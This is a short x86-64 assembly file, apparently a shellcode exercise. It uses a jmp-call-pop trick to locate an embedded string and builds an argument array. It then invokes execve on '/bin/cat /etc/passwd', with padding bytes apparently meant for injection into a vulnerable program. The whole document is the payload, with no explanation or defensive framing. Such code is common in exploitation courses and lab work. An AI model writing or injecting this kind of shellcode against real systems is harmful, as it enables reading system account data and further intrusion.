section .text
global _start

    jmp short c_data
_start:

    pop     rsi
    xor     rax, rax
    mov     byte [rsi + 8], al
    mov     byte [rsi + 20], al

    lea     rdx, 	[rsi]
    mov     qword 	[rsi + 21], rdx   
    lea     rdx, 	[rsi + 9]
    mov     qword 	[rsi + 29], rdx   	
    mov     qword 	[rsi + 37], rax   	

    mov     rdi, 	rsi                	
    lea     rsi, 	[rsi + 21]          	
    mov     rdx, 	rax   
    mov     al, 	59                 
    syscall

c_data:
    call    _start
    db      "/bin/cat:/etc/passwd:AAAAAAAAAAAAAAAAAAAAAAAA"      ; any trailing bytes you used for padding

